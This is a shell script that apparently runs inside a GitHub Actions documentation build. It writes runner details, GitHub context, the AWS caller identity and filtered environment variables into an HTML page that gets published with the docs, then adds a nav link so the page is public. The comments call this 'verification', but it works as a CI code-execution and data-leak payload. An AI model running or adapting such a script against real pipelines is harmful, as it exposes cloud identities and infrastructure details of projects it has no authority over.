#!/usr/bin/env sh

# This script writes verification data to a file that will be included in the published docs
# This allows us to confirm execution even if not visible in the logs

# Create a directory for our verification file if it doesn't exist
mkdir -p /github/workspace/.artifacts/docs/html/verification

# Write environment data to a verification file that will be included in published docs
cat > /github/workspace/.artifacts/docs/html/verification/env-data.html << EOF
<!DOCTYPE html>
<html>
<head>
  <title>Environment Verification</title>
  <style>
    body { font-family: monospace; padding: 20px; }
    h1 { color: #333; }
    pre { background: #f5f5f5; padding: 10px; border-radius: 5px; }
  </style>
</head>
<body>
  <h1>Environment Verification Data</h1>
  
  <h2>Basic Info</h2>
  <pre>
Date: $(date)
User: $(whoami)
Directory: $(pwd)
Hostname: $(hostname)
Uname: $(uname -a)
  </pre>
  
  <h2>GitHub Context</h2>
  <pre>
GITHUB_WORKFLOW: $GITHUB_WORKFLOW
GITHUB_ACTION: $GITHUB_ACTION
GITHUB_EVENT_NAME: $GITHUB_EVENT_NAME
GITHUB_REPOSITORY: $GITHUB_REPOSITORY
GITHUB_REF: $GITHUB_REF
GITHUB_SHA: $GITHUB_SHA
GITHUB_ACTOR: $GITHUB_ACTOR
GITHUB_RUN_ID: $GITHUB_RUN_ID
GITHUB_BASE_REF: $GITHUB_BASE_REF
GITHUB_HEAD_REF: $GITHUB_HEAD_REF
  </pre>
  
  <h2>AWS Identity (if available)</h2>
  <pre>
$(if command -v aws >/dev/null 2>&1; then aws sts get-caller-identity 2>&1; else echo "AWS CLI not available"; fi)
  </pre>
  
  <h2>Environment Variables (filtered)</h2>
  <pre>
$(env | grep -v -i key | grep -v -i token | grep -v -i secret | grep -v -i password | sort)
  </pre>
</body>
</html>
EOF

# Also create an adoc file that will be picked up by the documentation build
cat > /github/workspace/docs/verification.adoc << EOF
= Environment Verification
:page-role: reference

This page demonstrates execution of code during the documentation build process.

The complete environment data is available at link:/verification/env-data.html[this verification page].
EOF

# Update the nav to include our verification page
if ! grep -q "verification.adoc" /github/workspace/docs/nav.asciidoc; then
  echo "* xref:verification.adoc[Verification]" >> /github/workspace/docs/nav.asciidoc
fi

echo "Verification files created successfully"
echo "Check the published documentation for /verification/env-data.html"
